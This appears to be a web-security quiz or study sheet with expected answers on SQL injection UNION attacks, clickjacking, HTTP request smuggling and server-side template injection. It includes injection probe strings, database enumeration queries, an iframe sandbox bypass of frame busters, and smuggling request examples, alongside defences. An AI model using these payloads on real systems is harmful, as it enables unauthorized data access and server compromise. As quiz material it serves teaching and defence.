1. Explain how this query works `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`?  
**Expected Answer**: This SQL query returns a single result set with two columns, containing values from columns a and b in table1 and columns c and d in table2.

1. What two key requirements must be met for a `UNION` query to work?  
**Expected Answer**: 

   * The individual queries must return the same number of columns.
   * The data types in each column must be compatible between the individual queries.

1. To carry out a SQL injection UNION attack what does it normally involve finding out?  
**Expected Answer**: 

   * How many columns are being returned from the original query.
   * Which columns returned from the original query are of a suitable data type to hold the results from the injected query.

1. What are the two effective methods to determine the number of columns being returned from the original query in a SQL injection `UNION` attack?  
**Expected Answer**: The two effective methods to determine the number of columns in a SQL injection `UNION` attack are:

   * Using a series of `ORDER BY` clauses and incrementing the specified column index until an error occurs.
   * Submitting a series of `UNION SELECT` payloads with varying numbers of `NULL` values.

1. How is the method involving `ORDER BY` clauses executed in a SQL injection attack to determine the number of columns?  
**Expected Answer**: This method involves injecting `ORDER BY` clauses with incrementally increasing column indexes into the query. If the injection point is a quoted string within the WHERE clause of the original query, the attacker starts with `' ORDER BY 1--` and continues to increase the number (`' ORDER BY 2--`, `' ORDER BY 3--`, etc.) until the database returns an error. This error indicates that the specified column index exceeds the number of actual columns in the result set. The point just before the error occurs gives the total number of columns. The attacker observes changes in the application's response to detect when this error occurs.

1. How does the method using `UNION SELECT` payloads with `NULL` values work in identifying the number of columns in a SQL injection attack?  
**Expected Answer**: In this method, the attacker submits a series of `UNION SELECT` payloads, each specifying a different number of NULL values (`' UNION SELECT NULL--`, `' UNION SELECT NULL, NULL--`, etc.). The number of NULL values must match the number of columns in the original query for the `UNION` to be successful. If the number of NULLs doesn’t match, the database returns an error. When the correct number of NULLs is used, it results in an additional row being returned in the result set, with NULL values in each column. The attacker looks for changes in the application's response, such as additional content or different errors, to identify when the correct number of columns has been matched.

1. Why is `NULL` used as the values returned from the injected `SELECT` query?  
**Expected Answer**: Because the data types in each column must be compatible between the original and the injected queries. NULL is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct.

1. For a SQL injection UNION attack why do you need to find one or more columns in the original query results whose data type is, or is compatible with, string data?  
**Expected Answer**: The interesting data that you want to retrieve is normally in string form. After you determine the number of required columns, you can probe each column to test whether it can hold string data. You can submit a series of `UNION SELECT` payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:

   ```sql
   ' UNION SELECT 'a',NULL,NULL,NULL--
   ' UNION SELECT NULL,'a',NULL,NULL--
   ' UNION SELECT NULL,NULL,'a',NULL--
   ```
   If the column data type is not compatible with string data, the injected query will cause a database error, such as: Conversion failed when converting the varchar value 'a' to data type int. If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.

1. To exploit SQL Injection it's often necessary to find out what information about the database?  
**Expected Answer**: 

   * The type and version of the database software.
   * The tables and columns that the database contains.

1. What payloads can be potentially used to identify database type and version?  
**Expected Answer**: 

   | Database type | Query |
   | ----------- | ----------- |
   | Microsoft, MySQL      | SELECT @@version       |
   | Oracle   | SELECT * FROM v$version       |  
   | PostgreSQL   | SELECT version()        |  

1. What query can be used to list the tables in a database?  
**Expected Answer**: You can query information_schema.tables to list the tables in the database: `SELECT * FROM information_schema.tables`

1. What query can be used to list the tables in an Oracle database?  
**Expected Answer**: You can list tables by querying all_tables: `SELECT * FROM all_tables`

1. What is a first-order and second-order SQL injection?  
**Expected Answer**: First-order SQL injection occurs when the application processes user input from an HTTP request and incorporates the input into a SQL query in an unsafe way. Second-order SQL injection occurs when the application takes user input from an HTTP request and stores it for future use. This is usually done by placing the input into a database, but no vulnerability occurs at the point where the data is stored. Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into a SQL query in an unsafe way. For this reason, second-order SQL injection is also known as stored SQL injection.

1. How to prevent SQL injection?  
**Expected Answer**: Prevent most instances of SQL injection using parameterized queries (aka prepared statements) instead of string concatenation within the query. 

1. The following code is vulnerable to SQL injection because the user input is concatenated directly into the query. Fix it.  
   ```sql
   String query = "SELECT * FROM products WHERE category = '"+ input + "'";
   Statement statement = connection.createStatement();
   ResultSet resultSet = statement.executeQuery(query);
   ```
   **Expected Answer**: 
   ```sql
   PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
   statement.setString(1, input);
   ResultSet resultSet = statement.executeQuery();
   ```

1. What parts of the query does parameterized queries work, and where do they not?  
**Expected Answer**: You can use parameterized queries for any situation where untrusted input appears as data within the query, including the `WHERE` clause and values in an `INSERT` or `UPDATE` statement. They can't be used to handle untrusted input in other parts of the query, such as table or column names, or the `ORDER BY` clause. 

1. If an application places untrusted input into tables or column names, or the `ORDER BY` clause, how can this be remediated?  
**Expected Answer**: Application functionality that places untrusted data into these parts of the query needs to take a different approach, such as:

   * Whitelisting permitted input values.
   * Using different logic to deliver the required behavior.

1. What is a prepared statement?  
**Expected Answer**: Prepared statements separate the SQL code from the data. This separation means that user input is treated as data only and not part of the SQL command, preventing attackers from injecting malicious code. A typical prepared statement starts with defining the SQL query structure with placeholders for parameters. Each time a query is executed, the database server replaces the placeholders with the provided parameter values, ensuring these values are properly escaped and treated as data.

#### Clickjacking 

1. What is clickjacking?  
**Expected Answer**: Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website. The technique depends upon the incorporation of an invisible, actionable web page (or multiple pages) containing a button or hidden link, say, within an iframe. The iframe is overlaid on top of the user's anticipated decoy web page content. 

1. How to construct a basic clickjacking attack?  
**Expected Answer**: Clickjacking attacks use CSS to create and manipulate layers. The attacker incorporates the target website as an iframe layer overlaid on the decoy website. The target website iframe is positioned within the browser so that there is a precise overlap of the target action with the decoy website using appropriate width and height position values. Absolute and relative position values are used to ensure that the target website accurately overlaps the decoy regardless of screen size, browser type and platform. The z-index determines the stacking order of the iframe and website layers. The opacity value is defined as 0.0 (or close to 0.0) so that the iframe content is transparent to the user.

1. When are clickjacking attacks possible?  
**Expected Answer**: Clickjacking attacks are possible whenever websites can be framed.

1. What are frame busting scripts?  
**Expected Answer**: Preventative techniques are based upon restricting the framing capability for websites. A common client-side protection enacted through the web browser is to use frame busting or frame breaking scripts. These can be implemented via proprietary browser JavaScript add-ons or extensions such as NoScript. Scripts are often crafted so that they perform some or all of the following behaviors:

   * check and enforce that the current application window is the main or top window,
   * make all frames visible,
   * prevent clicking on invisible frames,
   * intercept and flag potential clickjacking attacks to the user.

1. What is an effective attacker workaround against frame busters?  
**Expected Answer**: An effective attacker workaround against frame busters is to use the HTML5 iframe `sandbox` attribute. When this is set with the `allow-forms` or `allow-scripts` values and the `allow-top-navigation` value is omitted then the frame buster script can be neutralized as the iframe cannot check whether or not it is the top window: `<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>`. Both the `allow-forms` and `allow-scripts` values permit the specified actions within the iframe but top-level navigation is disabled. This inhibits frame busting behaviors while allowing functionality within the targeted site.

1. What are the key elements that make combining clickjacking with a DOM-based Cross-Site Scripting (DXSS) attack particularly effective?  
**Expected Answer**: The combination is particularly effective because clickjacking can be used to initiate a specific action on the vulnerable application, such as clicking a button or link, which then triggers the DOM XSS exploit. The DOM XSS part of the attack executes the malicious script in the context of the victim's session, potentially stealing sensitive information, session tokens, or performing actions on behalf of the user.

1. How to prevent clickjacking attacks?  
**Expected Answer**: Clickjacking is a browser-side behavior and its success or otherwise depends upon browser functionality and conformity to prevailing web standards and best practice. Server-side protection against clickjacking is provided by defining and communicating constraints over the use of components such as iframes. However, implementation of protection depends upon browser compliance and enforcement of these constraints. Two mechanisms for server-side clickjacking protection are X-Frame-Options and Content Security Policy.

1. How to prevent clickjacking attacks with X-Frame-Options?  
**Expected Answer**: The header provides the website owner with control over the use of iframes or objects so that inclusion of a web page within a frame can be prohibited with the deny directive: `X-Frame-Options: deny`. Alternatively, framing can be restricted to the same origin as the website using the `sameorigin` directive: `X-Frame-Options: sameorigin` or to a named website using the allow-from directive: `X-Frame-Options: allow-from https://normal-website.com`. X-Frame-Options is not implemented consistently across browsers, but when properly applied in conjunction with Content Security Policy as part of a multi-layer defense strategy it can provide effective protection against clickjacking attacks.


1. How to prevent clickjacking attacks with Content Security Policy (CSP)?  
**Expected Answer**: The recommended clickjacking protection is to incorporate the `frame-ancestors` directive in the application's Content Security Policy. The `frame-ancestors 'none'` directive is similar in behavior to the X-Frame-Options `deny` directive. The `frame-ancestors 'self'` directive is broadly equivalent to the X-Frame-Options `sameorigin` directive. The following CSP whitelists frames to the same domain only: `Content-Security-Policy: frame-ancestors 'self';`. Alternatively, framing can be restricted to named sites: 
`Content-Security-Policy: frame-ancestors normal-website.com;`.

#### HTTP Request Smuggling

1. What is HTTP request smuggling?  
**Expected Answer**: HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users. Request smuggling is primarily associated with HTTP/1 requests. However, websites that support HTTP/2 may be vulnerable, depending on their back-end architecture.

1. What happens in an HTTP request smuggling attack?  
**Expected Answer**: Web applications frequently employ chains of HTTP servers between users and the ultimate application logic. Users send requests to a front-end server (sometimes called a load balancer or reverse proxy) and this server forwards requests to one or more back-end servers. When the front-end server forwards HTTP requests to a back-end server, it typically sends several requests over the same back-end network connection, because this is much more efficient and performant. The protocol is very simple; HTTP requests are sent one after another, and the receiving server has to determine where one request ends and the next one begin. In this situation, it is crucial that the front-end and back-end systems agree about the boundaries between requests. Otherwise, an attacker might be able to send an ambiguous request that gets interpreted differently by the front-end and back-end systems. The attacker causes part of their front-end request to be interpreted by the back-end server as the start of the next request. It is effectively prepended to the next request, and so can interfere with the way the application processes that request. 

1. How do HTTP request smuggling vulnerabilities arise?  
**Expected Answer**: Most HTTP request smuggling vulnerabilities arise because the HTTP/1 specification provides two different ways to specify where a request ends: the `Content-Length` header and the `Transfer-Encoding` header. The `Content-Length` header specifies the length of the message body in bytes. The `Transfer-Encoding` header can be used to specify that the message body uses chunked encoding. This means that the message body contains one or more chunks of data. Each chunk consists of the chunk size in bytes (expressed in hexadecimal), followed by a newline, followed by the chunk contents. The message is terminated with a chunk of size zero. 

1. What is an example of a HTTP request smuggling vulnerabilities with Transfer-Encoding?  
**Expected Answer**: 

   ```http
   POST /search HTTP/1.1
   Host: normal-website.com
   Content-Type: application/x-www-form-urlencoded
   Transfer-Encoding: chunked

   b
   q=smuggling
   0
   ```

1. What are the two methods provided by the HTTP/1 specification for specifying the length of HTTP messages, and what conflict arises when they are used together?  
**Expected Answer**: The HTTP/1 specification provides two methods for specifying the length of HTTP messages: the Content-Length header and the Transfer-Encoding header. A conflict arises when both headers are used together in a single message, as they can provide conflicting information about the message length. The specification states that if both headers are present, the Content-Length header should be ignored. However, this can lead to ambiguities, particularly in the context of multiple servers processing the same request.

1. Why might the HTTP specification's rule to ignore the Content-Length header in the presence of Transfer-Encoding not be sufficient in a multi-server environment?  
**Expected Answer**: In a multi-server environment, where multiple servers are chained together, such as with front-end and back-end servers different servers might interpret or process these headers inconsistently. If the front-end and back-end servers behave differently in relation to the (possibly obfuscated) Transfer-Encoding header, then they might disagree about the boundaries between successive requests, leading to request smuggling vulnerabilities.

1. What are the two main reasons why inconsistencies in handling Transfer-Encoding headers can lead to request smuggling vulnerabilities?  
**Expected Answer**: 

   * Lack of Support for Transfer-Encoding: Some servers might not support the Transfer-Encoding header in requests, leading to different interpretations of the request's length and boundaries.
   * Failure to Process Obfuscated Transfer-Encoding Headers: Some servers that do support the Transfer-Encoding header can be induced not to process it if the header is obfuscated, such as through extra whitespace or unusual casing. This can also lead to discrepancies in how different servers interpret the same request.

1. How can differing server behaviors regarding Transfer-Encoding headers result in request smuggling vulnerabilities?  
**Expected Answer**: If front-end and back-end servers behave differently in relation to the (possibly obfuscated) Transfer-Encoding header, they might disagree about the boundaries between successive requests. This disagreement can lead to request smuggling vulnerabilities, where part of a request is interpreted as a separate, subsequent request by one server but not the other. Such vulnerabilities can be exploited to inject or smuggle malicious requests, bypassing security controls or attacking other application users.

1. Are websites that use HTTP/2 end-to-end inherently immune to request smuggling attacks?  
**Expected Answer**: Yes. As the HTTP/2 specification introduces a single, robust mechanism for specifying the length of a request, there is no way for an attacker to introduce the required ambiguity. However, many websites have an HTTP/2-speaking front-end server, but deploy this in front of back-end infrastructure that only supports HTTP/1. This means that the front-end effectively has to translate the requests it receives into HTTP/1. This process is known as HTTP downgrading.

1. How to perform an HTTP request smuggling attack?  
**Expected Answer**: Classic request smuggling attacks involve placing both the Content-Length header and the Transfer-Encoding header into a single HTTP/1 request and manipulating these so that the front-end and back-end servers process the request differently. The exact way in which this is done depends on the behavior of the two servers:

   * CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.
   * TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.
   * TE.TE: the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.

1. Explain CL.TE vulnerabilities?  
   ```http
   POST / HTTP/1.1
   Host: vulnerable-website.com
   Content-Length: 13
   Transfer-Encoding: chunked

   0

   SMUGGLED
   ```
   **Expected Answer**: The front-end server processes the `Content-Length` header and determines that the request body is 13 bytes long, up to the end of `SMUGGLED`. This request is forwarded on to the back-end server. The back-end server processes the `Transfer-Encoding` header, and so treats the message body as using chunked encoding. It processes the first chunk, which is stated to be zero length, and so is treated as terminating the request. The following bytes, `SMUGGLED`, are left unprocessed, and the back-end server will treat these as being the start of the next request in the sequence.

1. Explain TE.CL vulnerabilities?  
   ```http
   POST / HTTP/1.1
   Host: vulnerable-website.com
   Content-Length: 3
   Transfer-Encoding: chunked

   8
   SMUGGLED
   0
   ```
   **Expected Answer**: The front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header. The front-end server processes the `Transfer-Encoding` header, and so treats the message body as using chunked encoding. It processes the first chunk, which is stated to be 8 bytes long, up to the start of the line following `SMUGGLED`. It processes the second chunk, which is stated to be zero length, and so is treated as terminating the request. This request is forwarded on to the back-end server. The back-end server processes the `Content-Length` header and determines that the request body is 3 bytes long, up to the start of the line following `8`. The following bytes, starting with `SMUGGLED`, are left unprocessed, and the back-end server will treat these as being the start of the next request in the sequence.

1. Explain TE.TE vulnerabilities?  
**Expected Answer**: The front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way. There are potentially endless ways to obfuscate the Transfer-Encoding header. To uncover a TE.TE vulnerability, it is necessary to find some variation of the Transfer-Encoding header such that only one of the front-end or back-end servers processes it, while the other server ignores it. Depending on whether it is the front-end or the back-end server that can be induced not to process the obfuscated Transfer-Encoding header, the remainder of the attack will take the same form as for the CL.TE or TE.CL vulnerabilities already described.

1. What is the most generally effective way to detect HTTP request smuggling vulnerabilities?  
**Expected Answer**: The most generally effective way to detect HTTP request smuggling vulnerabilities is to send requests that will cause a time delay in the application's responses if a vulnerability is present. 

1. How to confirm HTTP request smuggling vulnerabilities?  
**Expected Answer**: When a probable request smuggling vulnerability has been detected, you can obtain further evidence for the vulnerability by exploiting it to trigger differences in the contents of the application's responses. This involves sending two requests to the application in quick succession:

   * An "attack" request that is designed to interfere with the processing of the next request.
   * A "normal" request.

   This means essentially adding in a `GET /404 HTTP/1.1` request that will trigger on the follow-up request giving an indication in the response of the vulnerability.

1. What can exploiting HTTP request smuggling vulnerabilities lead to?  
**Expected Answer**: 

   * Using HTTP request smuggling to bypass front-end security controls
   * Revealing front-end request rewriting
   * Bypassing client authentication
   * Capturing other users' requests
   * Exploit reflected XSS
   * Turn an on-site redirect into an open redirect
   * Web cache poisoning and deception

1. What is HTTP/2 downgrading?  
**Expected Answer**: As HTTP/2 is still relatively new, web servers that support it often still have to communicate with legacy back-end infrastructure that only speaks HTTP/1. As a result, it has become common practice for front-end servers rewrite each incoming HTTP/2 request using HTTP/1 syntax, effectively generating its HTTP/1 equivalent. This "downgraded" request is then forwarded to the relevant back-end server instead.

1. How to prevent HTTP request smuggling vulnerabilities?  
**Expected Answer**: 

   * Use HTTP/2 end to end and disable HTTP downgrading if possible. HTTP/2 uses a robust mechanism for determining the length of requests and, when used end to end, is inherently protected against request smuggling. If you can't avoid HTTP downgrading, make sure you validate the rewritten request against the HTTP/1.1 specification. For example, reject requests that contain newlines in the headers, colons in header names, and spaces in the request method.
   * Make the front-end server normalize ambiguous requests and make the back-end server reject any that are still ambiguous, closing the TCP connection in the process.
   * Never assume that requests won't have a body. This is the fundamental cause of both CL.0 and client-side desync vulnerabilities.
   * Default to discarding the connection if server-level exceptions are triggered when handling requests.
   * If you route traffic through a forward proxy, ensure that upstream HTTP/2 is enabled if possible.

#### Server-Side Template Injection

1. What is server-side template injection?  
**Expected Answer**: Server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side. Template engines are designed to generate web pages by combining fixed templates with volatile data. Server-side template injection attacks can occur when user input is concatenated directly into a template, rather than passed in as data. This allows attackers to inject arbitrary template directives in order to manipulate the template engine, often enabling them to take complete control of the server. As the name suggests, server-side template injection payloads are delivered and evaluated server-side, potentially making them much more dangerous than a typical client-side template injection.

1. What is the impact of server-side template injection?  
**Expected Answer**: Server-side template injection vulnerabilities can expose websites to a variety of attacks depending on the template engine in question and how exactly the application uses it. In certain rare circumstances, these vulnerabilities pose no real security risk. However, most of the time, the impact of server-side template injection can be catastrophic. At the severe end of the scale, an attacker can potentially achieve remote code execution, taking full control of the back-end server and using it to perform other attacks on internal infrastructure. Even in cases where full remote code execution is not possible, an attacker can often still use server-side template injection as the basis for numerous other attacks, potentially gaining read access to sensitive data and arbitrary files on the server.

1. How do server-side template injection vulnerabilities arise?  
**Expected Answer**: Server-side template injection vulnerabilities arise when user input is concatenated into templates rather than being passed in as data. Static templates that simply provide placeholders into which dynamic content is rendered are generally not vulnerable to server-side template injection. However, as templates are simply strings, web developers sometimes directly concatenate user input into templates prior to rendering. For example: `$output = $twig->render("Dear " . $_GET['name']);`. Instead of a static value being passed into the template, part of the template itself is being dynamically generated using the `GET` parameter `name`. As template syntax is evaluated server-side, this potentially allows an attacker to place a server-side template injection payload inside the `name` parameter.

1. How do detect server-side template injection vulnerabilities?  
**Expected Answer**: The simplest initial approach is to try fuzzing the template by injecting a sequence of special characters commonly used in template expressions, such as `${{<%[%'"}}%\`. If an exception is raised, this indicates that the injected template syntax is potentially being interpreted by the server in some way. Server-side template injection vulnerabilities occur in two distinct contexts, each of which requires its own detection method. 

1. What are the two distinct contexts in server-side template injection vulnerabilities?  
**Expected Answer**: 

   * Plaintext context: Most template languages allow you to freely input content either by using HTML tags directly or by using the template's native syntax, which will be rendered to HTML on the back-end before the HTTP response is sent. This can sometimes be exploited for XSS and is in fact often mistaken for a simple XSS vulnerability. However, by setting mathematical operations as the value of the parameter, we can test whether this is also a potential entry point for a server-side template injection attack. During auditing, we might test for server-side template injection by requesting a URL such as: `http://vulnerable-website.com/?username=${7*7}`. If the resulting output contains `Hello 49`, this shows that the mathematical operation is being evaluated server-side.
   * Code context: User input being placed within a template expression. This may take the form of a user-controllable variable name being placed inside a parameter. One method of testing for server-side template injection in this context is to first establish that the parameter doesn't contain a direct XSS vulnerability by injecting arbitrary HTML into the value. In the absence of XSS, the next step is to try and break out of the statement using common templating syntax and attempt to inject arbitrary HTML after it: `http://vulnerable-website.com/?greeting=data.username}}<tag>`.

1. How to prevent server-side template injection vulnerabilities?  
**Expected Answer**: The best way to prevent server-side template injection is to not allow any users to modify or submit new templates. However, this is sometimes unavoidable due to business requirements. One of the simplest ways to avoid introducing server-side template injection vulnerabilities is to always use a "logic-less" template engine, such as Mustache, unless absolutely necessary. Separating the logic from presentation as much as possible can greatly reduce your exposure to the most dangerous template-based attacks. Finally, another complementary approach is to accept that arbitrary code execution is all but inevitable and apply your own sandboxing by deploying your template environment in a locked-down Docker container.









